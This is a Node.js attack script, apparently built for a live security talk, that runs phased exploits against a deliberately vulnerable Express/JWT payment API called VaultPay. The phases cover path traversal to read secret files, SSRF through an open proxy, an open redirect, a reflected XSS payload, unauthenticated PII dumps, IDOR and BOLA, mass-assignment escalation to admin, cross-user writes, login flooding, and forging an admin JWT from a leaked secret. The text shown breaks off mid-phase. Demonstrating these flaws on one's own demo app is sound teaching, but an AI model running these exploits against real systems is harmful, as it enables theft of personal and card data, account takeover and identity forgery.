#!/usr/bin/env node
/**
 * VaultPay demo attacker
 * ======================
 *
 * Black-box script against a VaultPay-style **Express 5** + JWT API.
 * (Target ships express@^5.2.1 — https://expressjs.com/en/guide/migrating-5/)
 *
 * Console output is built for a live talk: every probe shows
 * intent → wire request → response → loot / finding, plus a running scoreboard.
 *
 * Usage:
 *   node attack.mjs <API_BASE_URL>
 *   node attack.mjs http://localhost:4000
 *   node attack.mjs https://your-app.azurewebsites.net --drama
 *   node attack.mjs http://localhost:4000 --verbose
 *   node attack.mjs http://localhost:4000 --skip-flood --skip-slow
 *
 * Flags:
 *   --quiet       minimal color + hide wire traces (summary only)
 *   --verbose     print response body previews on every request
 *   --drama       pause between phases so the audience can read
 *   --json        print machine-readable findings at the end
 *   --skip-flood  skip concurrent login flood
 *   --skip-slow   skip the slow-endpoint probe
 *
 * Legal: only attack systems you own or have written permission to test.
 */

import { createHmac } from "node:crypto";
import net from "node:net";

const rawArgs = process.argv.slice(2);
const flags = new Set(rawArgs.filter((a) => a.startsWith("--")));
const positional = rawArgs.filter((a) => !a.startsWith("--"));
const targetArg = positional[0];

const quiet = flags.has("--quiet");
const verbose = flags.has("--verbose");
const drama = flags.has("--drama");
const asJson = flags.has("--json");
const skipFlood = flags.has("--skip-flood");
const skipSlow = flags.has("--skip-slow");

// Wire logging is ON by default for talks; --quiet turns it off.
const showWire = !quiet;

if (!targetArg) {
  console.error(
    "Usage: node attack.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--json] [--skip-flood] [--skip-slow]"
  );
  process.exit(2);
}

const BASE = targetArg.replace(/\/$/, "");
let baseUrl;
try {
  baseUrl = new URL(BASE);
} catch {
  console.error(`Invalid URL: ${targetArg}`);
  process.exit(2);
}

const HOST = baseUrl.hostname;
const PORT = Number(baseUrl.port) || (baseUrl.protocol === "https:" ? 443 : 80);
const IS_TLS = baseUrl.protocol === "https:";

// ---------------------------------------------------------------------------
// Colors + console helpers
// ---------------------------------------------------------------------------
const isTTY = process.stdout.isTTY && !quiet;
const c = {
  reset: isTTY ? "\x1b[0m" : "",
  bold: isTTY ? "\x1b[1m" : "",
  dim: isTTY ? "\x1b[2m" : "",
  red: isTTY ? "\x1b[31m" : "",
  green: isTTY ? "\x1b[32m" : "",
  yellow: isTTY ? "\x1b[33m" : "",
  blue: isTTY ? "\x1b[34m" : "",
  magenta: isTTY ? "\x1b[35m" : "",
  cyan: isTTY ? "\x1b[36m" : "",
  white: isTTY ? "\x1b[37m" : "",
  bgRed: isTTY ? "\x1b[41m" : "",
  bgGreen: isTTY ? "\x1b[42m" : "",
  bgYellow: isTTY ? "\x1b[43m" : "",
  bgBlue: isTTY ? "\x1b[44m" : "",
  bgMagenta: isTTY ? "\x1b[45m" : "",
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const dramaPause = async (ms = 700) => {
  if (drama) await sleep(ms);
};

function banner() {
  console.log(`
${c.red}${c.bold}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██████╗ ███████╗███╗   ███╗ ██████╗                                ║
║   ██╔══██╗██╔════╝████╗ ████║██╔═══██╗                               ║
║   ██║  ██║█████╗  ██╔████╔██║██║   ██║                               ║
║   ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║                               ║
║   ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝                               ║
║   ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝                                ║
║                                                                      ║
║   JWT ≠ Secure API   ·   Express 5 target   ·   black-box            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
  console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
  console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
  console.log(
    `${c.bold}Expect${c.reset}   Express 5.x vulnerable demo (JWT alone ≠ secure)`
  );
  console.log(
    `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}`
  );
  console.log(
    `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim} request   ${c.green}← RECV${c.reset}${c.dim} response   ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim} stolen data   ${c.red}[CRITICAL]${c.reset}${c.dim} finding${c.reset}\n`
  );
}

let phaseNo = 0;
function step(title) {
  phaseNo += 1;
  const n = String(phaseNo).padStart(2, "0");
  console.log(
    `\n${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
  );
  console.log(`${c.bold}${c.magenta}  PHASE ${n}  ·  ${title}${c.reset}`);
  console.log(
    `${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
  );
}

function intent(msg) {
  console.log(`  ${c.bgBlue}${c.white}${c.bold} WHY  ${c.reset} ${msg}`);
}

function narrate(msg) {
  console.log(`  ${c.cyan}»${c.reset} ${msg}`);
}

function ok(msg) {
  console.log(`  ${c.green}✓ DEFENDED / OK${c.reset}  ${msg}`);
}

function bad(msg) {
  console.log(`  ${c.red}✗ VULNERABLE${c.reset}     ${msg}`);
}

function info(msg) {
  console.log(`  ${c.dim}· ${msg}${c.reset}`);
}

function loot(label, value) {
  const raw = String(value ?? "");
  const v = raw.length > 200 ? raw.slice(0, 200) + "…" : raw;
  console.log(
    `  ${c.bgRed}${c.white}${c.bold} LOOT ${c.reset} ${c.yellow}${c.bold}${label}${c.reset}  ${v}`
  );
}

function finding(severity, title) {
  const colors = {
    CRITICAL: c.red,
    HIGH: c.yellow,
    MEDIUM: c.blue,
    INFO: c.dim,
  };
  const color = colors[severity] || c.white;
  console.log(`  ${color}${c.bold}[${severity}]${c.reset} ${title}`);
}

function scoreboard() {
  const by = stolen.findings.reduce((m, f) => {
    m[f.severity] = (m[f.severity] || 0) + 1;
    return m;
  }, {});
  const crit = by.CRITICAL || 0;
  const high = by.HIGH || 0;
  const med = by.MEDIUM || 0;
  const infoN = by.INFO || 0;
  console.log(
    `  ${c.dim}── scoreboard: ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
  );
}

function previewBody(text, max = verbose ? 400 : 160) {
  if (!text) return "(empty)";
  const one = text.replace(/\s+/g, " ").trim();
  return one.length > max ? one.slice(0, max) + "…" : one;
}

function formatAuth(headers = {}) {
  const a = headers.Authorization || headers.authorization;
  if (!a) return "none";
  if (a.length <= 28) return a;
  return a.slice(0, 22) + "…" + a.slice(-8);
}

function statusColor(status) {
  if (status >= 200 && status < 300) return c.green;
  if (status >= 300 && status < 400) return c.yellow;
  if (status >= 400 && status < 500) return c.yellow;
  if (status >= 500) return c.red;
  return c.dim;
}

// ---------------------------------------------------------------------------
// HTTP with talk-friendly wire logs
// ---------------------------------------------------------------------------
let reqSeq = 0;

/**
 * @param {string} method
 * @param {string} path
 * @param {{ headers?: Record<string,string>, body?: unknown, rawBody?: string, timeoutMs?: number, label?: string, silent?: boolean }} [opts]
 */
async function http(method, path, opts = {}) {
  const {
    headers = {},
    body,
    rawBody,
    timeoutMs = 15_000,
    label,
    silent = false,
  } = opts;

  const id = ++reqSeq;
  const payload =
    rawBody !== undefined ? rawBody : body !== undefined ? JSON.stringify(body) : undefined;
  const bytes = payload ? Buffer.byteLength(payload) : 0;

  if (showWire && !silent) {
    const tag = label ? ` ${c.dim}(${label})${c.reset}` : "";
    console.log(
      `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${id}${c.reset}${tag}  ${c.bold}${method}${c.reset} ${c.cyan}${path}${c.reset}`
    );
    console.log(
      `           ${c.dim}auth=${formatAuth(headers)}  body=${bytes ? bytes + " B" : "—"}  timeout=${timeoutMs}ms${c.reset}`
    );
    if (verbose && body && bytes < 2_000) {
      console.log(`           ${c.dim}json=${previewBody(JSON.stringify(body), 280)}${c.reset}`);
    } else if (verbose && body && bytes >= 2_000) {
      console.log(`           ${c.dim}json=(oversized payload, ${bytes} bytes)${c.reset}`);
    }
  }

  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  const t0 = Date.now();
  try {
    const res = await fetch(`${BASE}${path}`, {
      method,
      headers: {
        Accept: "application/json, text/plain, */*",
        ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
        ...headers,
      },
      body: payload,
      redirect: "manual",
      signal: ctrl.signal,
    });
    const text = await res.text();
    const ms = Date.now() - t0;
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {
      /* not json */
    }
    const headerObj = {};
    res.headers.forEach((v, k) => {
      headerObj[k.toLowerCase()] = v;
    });

    if (showWire && !silent) {
      const sc = statusColor(res.status);
      console.log(
        `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#${id}${c.reset}  ${sc}${c.bold}${res.status}${c.reset}  ${c.dim}${ms}ms  ${text.length} B${c.reset}`
      );
      if (headerObj.location) {
        console.log(`           ${c.dim}Location: ${headerObj.location}${c.reset}`);
      }
      if (verbose || res.status >= 500 || (json && (json.error || json.jwtSecret || json.stack))) {
        console.log(`           ${c.dim}body: ${previewBody(text)}${c.reset}`);
      } else if (showWire && text && text.length < 120) {
        console.log(`           ${c.dim}body: ${previewBody(text, 120)}${c.reset}`);
      }
    }

    return { status: res.status, headers: headerObj, text, json, ms, id };
  } catch (err) {
    const ms = Date.now() - t0;
    if (showWire && !silent) {
      console.log(
        `  ${c.red}${c.bold}← FAIL${c.reset}  ${c.bold}#${id}${c.reset}  ${c.red}${err.message}${c.reset}  ${c.dim}${ms}ms${c.reset}`
      );
    }
    throw err;
  } finally {
    clearTimeout(timer);
  }
}

/** Raw TCP HTTP/1.1 for probes fetch() cannot express cleanly. */
function rawHttp(payload, waitMs = 2500, label = "raw-tcp") {
  return new Promise((resolve) => {
    if (IS_TLS) {
      info("raw TCP skipped on HTTPS targets");
      resolve({ raw: "", status: 0, skipped: true });
      return;
    }
    const id = ++reqSeq;
    if (showWire) {
      const firstLine = payload.split("\r\n")[0];
      console.log(
        `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${id}${c.reset} ${c.dim}(${label})${c.reset}  raw TCP ${c.cyan}${firstLine}${c.reset}`
      );
      console.log(`           ${c.dim}payload=${payload.length} B to ${HOST}:${PORT}${c.reset}`);
    }
    const sock = net.connect(PORT, HOST);
    let buf = "";
    const t0 = Date.now();
    const finish = () => {
      try {
        sock.destroy();
      } catch {
        /* ignore */
      }
      const statusLine = buf.split("\r\n")[0] || "";
      const m = /HTTP\/\d\.\d\s+(\d{3})/.exec(statusLine);
      const status = m ? Number(m[1]) : 0;
      const ms = Date.now() - t0;
      if (showWire) {
        console.log(
          `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#${id}${c.reset}  ${statusColor(status)}${c.bold}${status || "—"}${c.reset}  ${c.dim}${ms}ms  ${buf.length} B  ${statusLine.slice(0, 60)}${c.reset}`
        );
      }
      resolve({ raw: buf, statusLine, status, skipped: false, ms });
    };
    sock.setTimeout(waitMs);
    sock.on("connect", () => sock.write(payload));
    sock.on("data", (d) => {
      buf += d.toString("latin1");
    });
    sock.on("timeout", finish);
    sock.on("close", finish);
    sock.on("error", finish);
  });
}

function b64url(input) {
  return Buffer.from(input)
    .toString("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

function signHs256(payloadObj, secret) {
  const header = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
  const payload = b64url(JSON.stringify(payloadObj));
  const data = `${header}.${payload}`;
  const sig = createHmac("sha256", secret)
    .update(data)
    .digest("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
  return `${data}.${sig}`;
}

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
const stolen = {
  users: [],
  orders: [],
  jwtSecret: null,
  token: null,
  loginUser: null,
  forgedAdminToken: null,
  escalated: false,
  findings: [],
};

function record(severity, title, detail) {
  stolen.findings.push({ severity, title, detail });
  finding(severity, title);
  if (detail) info(detail);
  scoreboard();
}

// ---------------------------------------------------------------------------
// Attack phases
// ---------------------------------------------------------------------------
async function phaseRecon() {
  step("Recon — is the API alive?");
  intent("Confirm the target responds before we burn time on exploits.");
  try {
    const health = await http("GET", "/api/health", { label: "health-check" });
    if (health.status === 200) {
      ok(`API is up: service=${health.json?.service || "?"} time=${health.json?.time || "?"}`);
    } else {
      const root = await http("GET", "/", { label: "root-fallback" });
      if (root.status >= 200 && root.status < 500) ok(`Root answered ${root.status}`);
      else {
        bad(`No useful response (health ${health.status})`);
        process.exit(1);
      }
    }
  } catch (err) {
    bad(`Cannot reach ${BASE}: ${err.message}`);
    process.exit(1);
  }
  const root = await http("GET", "/", { label: "self-docs" });
  if (root.json?.docs) {
    narrate("API helpfully advertises its own routes:");
    info(JSON.stringify(root.json.docs));
  }
  await dramaPause();
}

async function phaseMissingSecurityHeaders() {
  step("Missing browser security headers (no login)");
  intent("Daloy auto-installs secureHeaders. Bare Express usually sends none.");
  const res = await http("GET", "/api/health", { label: "header-audit" });
  const needed = [
    "x-content-type-options",
    "x-frame-options",
    "content-security-policy",
    "strict-transport-security",
    "referrer-policy",
    "permissions-policy",
  ];
  narrate("Checking response headers for browser hardening…");
  for (const h of needed) {
    if (res.headers[h]) ok(`${h}: ${res.headers[h]}`);
    else bad(`${h}: MISSING`);
  }
  const missing = needed.filter((h) => !res.headers[h]);
  if (missing.length >= 4) {
    loot("missing-headers", missing.join(", "));
    record(
      "MEDIUM",
      "No secure response headers",
      "Clickjacking / MIME sniffing / missing CSP — Daloy secureHeaders covers these"
    );
  } else {
    ok(`Most security headers present (${needed.length - missing.length}/${needed.length})`);
  }
  await dramaPause();
}

async function phaseBodyLimit() {
  step("Oversized JSON body (no tight body limit)");
  intent("Daloy default bodyLimitBytes = 1 MiB → 413. This demo allows ~50mb.");
  narrate("Building a ~1.5 MiB password field and POSTing it to /api/auth/login…");
  const pad = "x".repeat(1.5 * 1024 * 1024);
  try {
    const res = await http("POST", "/api/auth/login", {
      body: { email: "nobody@example.com", password: pad },
      timeoutMs: 60_000,
      label: "1.5MiB-body",
    });
    if (res.status === 413) {
      ok(`Server rejected oversized body with 413 (${res.ms}ms)`);
    } else if (res.status === 401 || res.status === 400) {
      bad(`Accepted ~1.5 MiB JSON → HTTP ${res.status} in ${res.ms}ms (expected 413 on hardened API)`);
      record(
        "HIGH",
        "Oversized JSON body accepted (no tight bodyLimit)",
        "Daloy readBodyLimited would 413 above 1 MiB by default"
      );
    } else {
      bad(`Unexpected status ${res.status} for large body (${res.ms}ms)`);
      record("MEDIUM", `Large body produced status ${res.status}`, "Expected 413 on a hardened API");
    }
  } catch (err) {
    info(`Large body probe error: ${err.message}`);
    record("INFO", "Large body probe did not complete", err.message);
  }
  await dramaPause();
}

async function phaseNoRateLimitFlood() {
  step("Login flood — no rate limit (no valid password needed)");
  intent("Daloy rateLimit / loginThrottle → 429. Tutorial Express: free credential stuffing.");
  if (skipFlood) {
    info("Skipped (--skip-flood)");
    return;
  }
  const N = 40;
  narrate(`Firing ${N} parallel POST /api/auth/login with wrong passwords…`);
  const t0 = Date.now();
  const results = await Promise.all(
    Array.from({ length: N }, (_, i) =>
      http("POST", "/api/auth/login", {
        body: { email: `flood${i}@evil.test`, password: "wrong-password" },
        timeoutMs: 20_000,
        silent: true,
        label: `flood-${i}`,
      }).catch((e) => ({ status: 0, error: e.message, ms: 0 }))
    )
  );
  const ms = Date.now() - t0;
  const statuses = results.map((r) => r.status);
  const counted = statuses.reduce((m, s) => {
    m[s] = (m[s] || 0) + 1;
    return m;
  }, {});
  const got429 = statuses.filter((s) => s === 429).length;
  const got401 = statuses.filter((s) => s === 401).length;

  console.log(
    `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#flood${c.reset}  ${N}× parallel POST /api/auth/login  ${c.dim}(wire logs collapsed)${c.reset}`
  );
  console.log(
    `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#flood${c.reset}  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
  );

  if (got429 === 0 && got401 >= N * 0.7) {
    bad(`${N} failures accepted with zero 429 responses`);
    record(
      "HIGH",
      "No rate limiting on authentication",
      `${N} concurrent failures, zero 429 — credential stuffing is free`
    );
  } else if (got429 > 0) {
    ok(`Server rate-limited some requests (${got429} × 429)`);
  } else {
    record("MEDIUM", "Flood produced mixed failures", JSON.stringify(counted));
  }
  await dramaPause();
}

async function phasePathTraversal() {
  step("Path traversal on /api/files (no login)");
  intent("Escape public/ into secrets/ via ../ — Daloy path hardening would contain this.");
  narrate("First, read the intended public file…");
  const legit = await http("GET", "/api/files?name=welcome.txt", { label: "legit-file" });
  if (legit.status === 200 && /Welcome to VaultPay/i.test(legit.text)) {
    ok("welcome.txt is readable (expected)");
  } else {
    info(`welcome.txt → ${legit.status}`);
  }

  narrate("Now walk up directories into data/secrets/…");
  const attempts = ["../secrets/jwt-backup.txt", "..\\secrets\\jwt-backup.txt"];
  let hit = null;
  for (const t of attempts) {
    const res = await http("GET", `/api/files?name=${encodeURIComponent(t).replace(/%2F/gi, "/")}`, {
      label: `traverse:${t}`,
    });
    if (res.status === 200 && /JWT_SECRET=/.test(res.text)) {
      hit = { t, body: res.text };
      break;
    }
    const res2 = await http("GET", `/api/files?name=${t}`, { label: `traverse-raw:${t}` });
    if (res2.status === 200 && /JWT_SECRET=/.test(res2.text)) {
      hit = { t, body: res2.text };
      break;
    }
  }

  if (hit) {
    bad(`Path traversal succeeded with name=${hit.t}`);
    loot("secret-file", hit.body.replace(/\s+/g, " ").trim());
    const m = /JWT_SECRET=(\S+)/.exec(hit.body);
    if (m) {
      stolen.jwtSecret = stolen.jwtSecret || m[1];
      loot("JWT_SECRET", stolen.jwtSecret);
    }
    record(
      "CRITICAL",
      "Path traversal reads server secret files",
      "Unauthenticated attacker escapes public/ into secrets/"
    );
  } else {
    ok("Path traversal did not yield secrets (unexpected for this demo)");
  }
  await dramaPause();
}

async function phaseOpenRedirect() {
  step("Open redirect on /api/go (no login)");
  intent("Daloy safeRedirect allowlists destinations. This endpoint accepts any URL.");
  const evil = "https://evil-phish.example/steal";
  narrate(`Requesting redirect to ${evil}…`);
  const res = await http("GET", `/api/go?url=${encodeURIComponent(evil)}`, {
    label: "open-redirect",
  });
  const loc = res.headers.location || "";
  if (res.status >= 300 && res.status < 400 && loc.includes("evil-phish.example")) {
    bad(`Browser would follow Location → ${loc}`);
    loot("redirect-to", loc);
    record("HIGH", "Open redirect", "Any absolute URL accepted — phishing after login flows");
  } else {
    ok(`Redirect not open (status ${res.status}, location=${loc || "none"})`);
  }
  await dramaPause();
}

async function phaseSsrfProxy() {
  step("Open proxy / SSRF on /api/proxy (no login)");
  intent("Daloy fetchGuard blocks loopback/link-local/metadata. Here the server fetches for us.");
  const loop = `${BASE}/api/debug/config`;
  narrate(`Asking the server to fetch its own debug config: ${loop}`);
  const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
    timeoutMs: 12_000,
    label: "ssrf-loopback",
  });
  if (res.status === 200 && /jwtSecret|supersecret/i.test(res.text)) {
    bad("Open proxy reached loopback and returned secrets");
    loot("ssrf-body", res.text.slice(0, 240));
    try {
      const j = JSON.parse(res.text);
      if (j.jwtSecret) {
        stolen.jwtSecret = stolen.jwtSecret || j.jwtSecret;
        loot("JWT_SECRET", stolen.jwtSecret);
      }
    } catch {
      /* ignore */
    }
    record(
      "CRITICAL",
      "SSRF open proxy can reach internal URLs",
      "fetchGuard would block loopback / metadata targets"
    );
  } else if (res.status === 200) {
    bad(`Open proxy returned 200 for ${loop}`);
    record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120));
  } else {
    info(`Proxy probe → ${res.status}`);
  }
  await dramaPause();
}

async function phaseStackAndEcho() {
  step("Error stack leak + reflected XSS sink (no login)");
  intent("Prod should redact stacks. HTML must never echo raw query strings.");
  narrate("Triggering an intentional server error…");
  const boom = await http("GET", "/api/boom", { label: "stack-leak" });
  if (boom.status >= 500 && boom.json?.stack) {
    bad("Stack trace returned to the client");
    loot("stack-top", String(boom.json.stack).split("\n")[0]);
    record(
      "MEDIUM",
      "Production-style stack traces exposed",
      "Daloy prod-mode problem+json redacts internals"
    );
  } else {
    ok(`No stack in boom response (${boom.status})`);
  }

  const xss = `<img src=x onerror=alert(1)>`;
  narrate("Reflecting an XSS payload through /api/echo as text/html…");
  const echo = await http("GET", `/api/echo?msg=${encodeURIComponent(xss)}`, {
    label: "xss-echo",
  });
  if (
    echo.status === 200 &&
    echo.text.includes(xss) &&
    /text\/html/i.test(echo.headers["content-type"] || "")
  ) {
    bad("Payload reflected in HTML response (XSS sink)");
    loot("reflected", xss);
    record(
      "HIGH",
      "Reflected XSS via HTML echo endpoint",
      "No output encoding; content-type text/html"
    );
  } else {
    ok("Echo XSS probe did not reflect as HTML");
  }
  await dramaPause();
}

async function phaseSlowTimeout() {
  step("Missing request timeout on /api/slow (no login)");
  intent("Daloy requestTimeoutMs defaults to 30s. Bare Express holds the socket.");
  if (skipSlow) {
    info("Skipped (--skip-slow)");
    return;
  }
  narrate("Calling /api/slow?ms=3000 and measuring wall time…");
  const res = await http("GET", "/api/slow?ms=3000", {
    timeoutMs: 10_000,
    label: "slow-handler",
  });
  if (res.status === 200 && res.ms >= 2500) {
    bad(`Handler held the connection for ${res.ms}ms with no server timeout`);
    record(
      "MEDIUM",
      "No requestTimeoutMs — slow handlers hold sockets",
      "Amplifies connection exhaustion under load"
    );
  } else {
    info(`slow probe status=${res.status} elapsed=${res.ms}ms`);
  }
  await dramaPause();
}

async function phaseUnauthDataTheft() {
  step("Unauthenticated data theft (users / IDOR / search / debug)");
  intent("No password. No token. Just HTTP GET — this is the audience scare moment.");

  narrate("Dumping /api/users with zero Authorization header…");
  const usersRes = await http("GET", "/api/users", { label: "user-dump" });
  if (usersRes.status === 200 && Array.isArray(usersRes.json?.users)) {
    stolen.users = usersRes.json.users;
    bad(`Returned ${stolen.users.length} full accounts without auth`);
    for (const u of stolen.users) {
      loot(
        `#${u.id} ${u.email}`,
        `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
      );
    }
    record("CRITICAL", "Unauthenticated user dump", "API1/API3 — authz missing entirely");
  } else {
    ok(`GET /api/users → ${usersRes.status}`);
  }

  const id = stolen.users[0]?.id ?? 1;
  narrate(`IDOR: fetch /api/users/${id} still without auth…`);
  const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
  if (one.status === 200 && one.json?.user?.ssn) {
    bad(`Full PII for user #${id}`);
    loot("SSN", one.json.user.ssn);
    loot("card", one.json.user.cardNumber);
    loot("CVV", one.json.user.cardCvv);
    loot("note", one.json.user.internalNote);
    record("CRITICAL", "IDOR on /api/users/:id without auth", "Walk the id space");
  }

  narrate("Checking leftover debug endpoint…");
  const dbg = await http("GET", "/api/debug/config", { label: "debug-leak" });
  if (dbg.status === 200 && dbg.json?.jwtSecret) {
    stolen.jwtSecret = dbg.json.jwtSecret;
    bad("Debug config is public");
    loot("JWT_SECRET", stolen.jwtSecret);
    loot("featureFlags", JSON.stringify(dbg.json.featureFlags || {}));
    record("CRITICAL", "Debug endpoint leaks JWT signing secret", "Forge any identity next");
  }

  narrate('Searching PII with q="oslo"…');
  const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
  if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
    bad(`Search returned ${search.json.results.length} PII hits without auth`);
    for (const r of search.json.results) {
      loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
    }
    record("HIGH", "Unauthenticated PII search", "Substring match on address/SSN/email");
  }
  await dramaPause(900);
}

async function phaseAccountEnumeration() {
  step("Account enumeration via login error messages");
  intent("Same generic error always. Different messages = free user discovery.");
  narrate("Compare login errors for missing email vs wrong password…");
  const missing = await http("POST", "/api/auth/login", {
    body: { email: "definitely-not-registered@example.com", password: "x" },
    label: "enum-missing",
  });
  const wrong = await http("POST", "/api/auth/login", {
    body: { email: "alice@example.com", password: "not-the-password" },
    label: "enum-wrong-pw",
  });
  const e1 = missing.json?.error || missing.text;
  const e2 = wrong.json?.error || wrong.text;
  loot("missing-user-error", e1);
  loot("wrong-password-error", e2);
  if (e1 && e2 && e1 !== e2) {
    bad("Error strings differ — accounts are enumerable");
    record(
      "MEDIUM",
      "Login error messages enable account enumeration",
      "Use one generic message + constant-time compare"
    );
  } else {
    ok("Login errors are uniform");
  }
  await dramaPause();
}

async function phaseAuthzAndForgery() {
  step("Login, BOLA, mass assignment, admin, JWT forge");
  intent("JWT proves someone logged in. It does not decide what they may read or write.");

  const candidates = [
    { email: "alice@example.com", password: "password123" },
    { email: "bob@example.com", password: "bobsecret" },
    { email: "admin@vaultpay.demo", password: "admin123" },
  ];
  let loginOk = null;
  for (const cred of candidates) {
    narrate(`Trying demo login ${cred.email}…`);
    const res = await http("POST", "/api/auth/login", {
      body: cred,
      label: `login:${cred.email}`,
    });
    if (res.status === 200 && res.json?.token) {
      loginOk = { ...cred, token: res.json.token, user: res.json.user };
      break;
    }
  }
  if (!loginOk) {
    bad("Could not login with demo credentials — skipping authz chain");
    return;
  }
  stolen.token = loginOk.token;
  stolen.loginUser = loginOk.user;
  ok(`Logged in as ${loginOk.email} (role=${loginOk.user.role})`);
  loot("token", loginOk.token);

  narrate("Fetching /api/orders with this user JWT — server should scope to self…");
  const orders = await http("GET", "/api/orders", {
    headers: { Authorization: `Bearer ${stolen.token}` },
    label: "bola-orders",
  });
  if (orders.status === 200 && Array.isArray(orders.json?.orders)) {
    stolen.orders = orders.json.orders;
    const others = new Set(
      stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
    );
    bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA)`);
    for (const o of stolen.orders.slice(0, 8)) {
      loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
    }
    record("CRITICAL", "BOLA on /api/orders", "Authn present, authz missing");
  }

  narrate("Register a disposable attacker so seed demo accounts stay intact…");
  const regEmail = `pwned-${Date.now()}@evil.test`;
  const reg = await http("POST", "/api/auth/register", {
    body: { email: regEmail, password: "Attacker1!", name: "Attacker" },
    label: "register-attacker",
  });
  let escToken = stolen.token;
  let escId = loginOk.user.id;
  if (reg.status === 201 && reg.json?.token) {
    escToken = reg.json.token;
    escId = reg.json.user.id;
    ok(`Attacker account #${escId} ${regEmail}`);
  }

  narrate(`Mass-assign role=admin + balance on user #${escId}…`);
  const escalate = await http("PUT", `/api/users/${escId}`, {
    headers: { Authorization: `Bearer ${escToken}` },
    body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
    label: "mass-assign-admin",
  });
  if (escalate.status === 200 && escalate.json?.user?.role === "admin") {
    stolen.escalated = true;
    bad(`User #${escId} is now admin with balance=${escalate.json.user.balance}`);
    loot("new-role", escalate.json.user.role);
    loot("new-balance", String(escalate.json.user.balance));
    record("CRITICAL", "Mass assignment privilege escalation", "No field allowlist on PUT body");
  } else {
    info(`Mass assignment → ${escalate.status}`);
  }

  narrate("Cross-user write: attacker token edits a *different* user id…");
  const victimReg = await http("POST", "/api/auth/register", {
    body: {
      email: `victim-${Date.now()}@evil.test`,
      password: "VictimPass1!",
      name: "Disposable Victim",
    },
    label: "register-victim",
  });
  const victimId = victimReg.json?.user?.id || 2;
  const hijack = await http("PUT", `/api/users/${victimId}`, {
    headers: { Authorization: `Bearer ${escToken}` },
    body: {
      balance: 0,
      internalNote: "cleared by attacker via cross-user PUT",
      name: "Hijacked Victim",
    },
    label: "cross-user-write",
  });
  if (hijack.status === 200 && hijack.json?.user?.name === "Hijacked Victim") {
    bad(`Rewrote user #${victimId} without ownership check`);
    loot("victim", JSON.stringify(hijack.json.user));
    record(
      "CRITICAL",
      "Cross-user write without ownership check",
      "Any authenticated client can edit any user id"
    );
  } else {
    info(`Cross-user write → ${hijack.status}`);
  }

  narrate("Hit /api/admin/stats with a non-admin-issued JWT…");
  const stats = await http("GET", "/api/admin/stats", {
    headers: { Authorization: `Bearer ${escToken}` },
    label: "admin-stats",
  });
  if (stats.status === 200 && stats.json?.accounts) {
    bad(`Admin dashboard open — ${stats.json.accounts.length} accounts with passwords`);
    for (const a of stats.json.accounts.slice(0, 6)) {
      loot(a.email, `password=${a.password} ssn=${a.ssn}`);
    }
    record("CRITICAL", "Admin route checks login only, not role", "requireAuth ≠ requireRole");
  }

  if (stolen.jwtSecret) {
    narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
    const admin =
      stolen.users.find((u) => u.role === "admin") || {
        id: 3,
        email: "admin@vaultpay.demo",
      };
    const forged = signHs256(
      {
        sub: admin.id,
        email: admin.email,
        role: "admin",
        name: "Forged Admin",
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 86400,
      },
      stolen.jwtSecret
    );
    stolen.forgedAdminToken = forged;
    loot("forged-jwt", forged);
    const me = await http("GET", "/api/me", {
      headers: { Authorization: `Bearer ${forged}` },
      label: "forged-admin-me",
    });
    if (me.status === 200) {
      bad("Server accepted a fully attacker-forged admin JWT");
      loot("forged-identity", JSON.stringify(me.json?.user));
